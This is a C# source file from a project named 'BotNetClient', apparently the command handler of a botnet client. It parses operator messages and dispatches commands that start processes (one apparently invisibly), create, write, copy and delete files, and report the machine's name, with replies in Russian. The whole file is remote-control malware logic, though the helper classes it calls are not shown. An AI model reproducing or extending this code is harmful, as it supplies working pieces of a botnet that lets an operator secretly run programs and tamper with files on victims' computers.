using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BotNetClient
{
    class handler
    {
        public static string handl(string message)
        {
            string a = null;
            string[] msg = message.Split(new char[]{'^'},StringSplitOptions.RemoveEmptyEntries) ;
            if (msg[0].StartsWith("/"))
            {
                msg[0] = msg[0].Remove(0, 1);
            }
            else
            {
                return "Команда не распознана";
            }
            switch (msg[0])
            {
                case "startinvis":
                    ProcessStartInvis.Class1.code(msg[1]);
                    break;
                case "nameofpc":
                    a = NameOfPc.Class1.code();
                    break;
                case "createwrite":
                    CreateWrite.Class1.code(msg[1],msg[2]);
                    break;
                case "start":
                    ProcessStart.Class1.code(msg[1]);
                    break;
                case "create":
                    ProcessCreate.Class1.code(msg[1]);
                    break;
                case "delete":
                    ProcessDelete.Class1.code(msg[1]);
                    break;
                case "copy":
                    ProcessCopy.Class1.code(msg[1], msg[2]);
                    break;
                default:
                    return("Команда введена неверно или отсуствует у клиента");
            }
            return $"Done!  {a}";
        }
    }
}
